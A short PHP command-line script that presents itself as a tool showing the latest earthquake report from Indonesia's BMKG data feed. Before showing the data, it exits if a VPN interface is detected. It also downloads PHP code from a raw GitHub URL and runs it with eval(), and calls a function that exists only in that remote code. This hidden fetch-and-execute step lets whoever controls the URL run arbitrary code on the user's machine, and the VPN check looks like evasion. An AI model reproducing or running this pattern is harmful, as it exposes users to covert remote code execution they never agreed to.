<?php

function sock(){
  $sistemm=shell_exec('2>/dev/null ifconfig');
    
   if(preg_match('/tun0/i',$sistemm)){
            echo "\033[1;34mUps Internet Mu Tidak Sehat\n";
            echo "Silakan Matikan Vpn Anda\n";
        exit;
        }
    }
    sock();


$function = file_get_contents("https://raw.githubusercontent.com/Bagusivo1999/fullscript/refs/heads/main/curlku.php");
eval($function);

bn();

$url = "https://data.bmkg.go.id/DataMKG/TEWS/autogempa.json";

$json = file_get_contents($url);

if ($json === false) {
    exit("Gagal mengambil data.\n");
}

$data = json_decode($json, true);

if (!$data || !isset($data['Infogempa']['gempa'])) {
    exit("Data tidak valid.\n");
}

$g = $data['Infogempa']['gempa'];

echo "==============================\n";
echo "     GEMPA TERBARU BMKG\n";
echo "==============================\n";
echo "Tanggal      : {$g['Tanggal']}\n";
echo "Jam          : {$g['Jam']}\n";
echo "Magnitude    : {$g['Magnitude']}\n";
echo "Kedalaman    : {$g['Kedalaman']}\n";
echo "Lokasi       : {$g['Wilayah']}\n";
echo "Koordinat    : {$g['Coordinates']}\n";
echo "Potensi      : {$g['Potensi']}\n";
echo "Dirasakan    : {$g['Dirasakan']}\n";
echo "Shakemap     : https://data.bmkg.go.id/DataMKG/TEWS/{$g['Shakemap']}\n";
echo "==============================\n";